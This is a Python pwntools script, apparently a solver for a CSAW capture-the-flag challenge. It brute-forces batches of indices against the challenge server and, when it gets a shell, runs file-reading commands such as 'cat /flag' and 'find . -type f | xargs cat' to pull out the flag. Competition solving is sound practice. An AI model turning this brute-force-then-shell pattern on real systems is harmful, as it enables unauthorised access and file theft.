from pwn import *
import re
import sys
import time
import os
import json

# Constants
HOST = 'pwn.chal.csaw.io'
PORT = 5000
PROGRESS_FILE = '/home/ctfplayer/ctf_files/get_flag_full_brute.progress.json'
LOG_FILE = '/home/ctfplayer/ctf_files/get_flag_full_brute.log'
SEARCH_LIMIT = 4096
BATCH_SIZE = 3
DELAY_BETWEEN = 0.2

def is_shell(output):
    return any(x in output for x in [b'$', b'#', b'/bin/sh'])

def try_indices(indices):
    flag = None
    try:
        with remote(HOST, PORT, timeout=5) as conn:
            intro = conn.recvuntil(b'>', timeout=1)
            idxs = ','.join(map(str, indices)).encode() + b'\n'
            conn.send(idxs)
            response = b''
            try:
                response += conn.recv(timeout=0.5)
            except EOFError:
                pass
            if is_shell(response):
                for cmd in [b'cat flag.txt\n', b'cat /flag\n', b'ls;cat flag*\n', b'ls -al\n', b'pwd\n', b'find . -type f | xargs cat | grep flag{\n']:
                    try:
                        conn.send(cmd)
                        out = conn.recv(timeout=1)
                        res = re.search(rb'flag\{[A-Za-z0-9_\-\!@#$%^&*()+=~`.,:;<>/?]+\}', out)
                        if res:
                            flag = res.group().decode()
                            print(f'[+] Found flag: {flag}')
                            return flag, indices
                    except Exception:
                        pass
            elif b'flag{' in response:
                flag = re.search(rb'flag\{[^\}]+\}', response).group().decode()
                print(f'[+] Found flag: {flag}')
                return flag, indices
    except Exception as e:
        pass
    return None, indices

def save_progress(i):
    with open(PROGRESS_FILE, 'w') as f:
        json.dump({'last_index': i}, f)

def load_progress():
    try:
        with open(PROGRESS_FILE, 'r') as f:
            d = json.load(f)
            return d.get('last_index', 0)
    except Exception:
        return 0

def log_attempt(indices):
    with open(LOG_FILE, 'a') as log:
        log.write(f'Trying indices: {indices}\n')
    print(f'Trying indices: {indices}')

def main():
    found = False
    start = load_progress()
    for i in range(start, SEARCH_LIMIT, BATCH_SIZE):
        indices = list(range(i, min(i+BATCH_SIZE, SEARCH_LIMIT)))
        log_attempt(indices)
        flag, idxs = try_indices(indices)
        save_progress(i+BATCH_SIZE)
        if flag:
            print(f'[!][FOUND] Indices {idxs}: {flag}')
            with open('/home/ctfplayer/ctf_files/latest_flag.out', 'w') as f:
                f.write(flag + '\n')
            found = True
            break
        time.sleep(DELAY_BETWEEN)
    if not found:
        print('[!] Flag not found after all attempts!')

if __name__ == '__main__':
    main()
